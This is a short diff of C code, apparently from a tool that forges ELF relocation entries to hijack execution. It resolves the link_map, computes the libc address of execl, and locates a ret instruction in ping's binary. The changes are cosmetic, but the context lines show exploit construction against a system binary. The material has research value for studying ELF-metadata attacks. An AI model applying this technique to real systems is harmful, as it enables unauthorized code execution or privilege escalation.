@@ -83,7 +83,6 @@ char *get_symname_from_relplt_ent(f, r)
   sym = get_sym_from_relplt_ent(f, r);
   eresi_Addr nameidx = sym->st_name;
   return  (char *) (strtab->data + nameidx);
-  // lookup
 }
 
 // we have to implemt this ourselves becasuse eresi's version asumes we have rel entries (not rela)
@@ -223,15 +222,12 @@ int main(int argv, char *argc[])
   set_next_reloc(&l, R_X86_64_COPY, got.index, symtab_get_value_addr(&got), 0);
   set_next_reloc(&l, R_X86_64_64, got.index, symtab_get_value_addr(&got), get_l_next(0)); //calculate l_next address location
 
-  //set_next_reloc(&l, R_X86_64_COPY, got.index, symtab_get_value_addr(&got), 0);
-  //set_next_reloc(&l, R_X86_64_64, got.index, symtab_get_value_addr(&got), get_l_next(0)); //calculate l_next address location
-
   set_next_reloc(&l, R_X86_64_COPY, got.index, symtab_get_value_addr(&got), 0); //get link_map addr
   set_next_reloc(&l, R_X86_64_COPY, got.index, symtab_get_value_addr(&got), 0); //get laddr
 
   printf("&execve: %x\n", get_execl_offset(libc));
 
-  ret = find_ret_loc(l.lm_f); // find a locatin of a ret instruction in ping's binary
+  ret = find_ret_loc(l.lm_f); // find a location of a ret instruction in ping's binary
   printf("Found a ret at %x\n", ret);
   set_next_reloc(&l, R_X86_64_64, got.index, symtab_get_value_addr(&got), get_execl_offset(libc));//adds offset of execl to libc base addr, stores in symbol's value
 
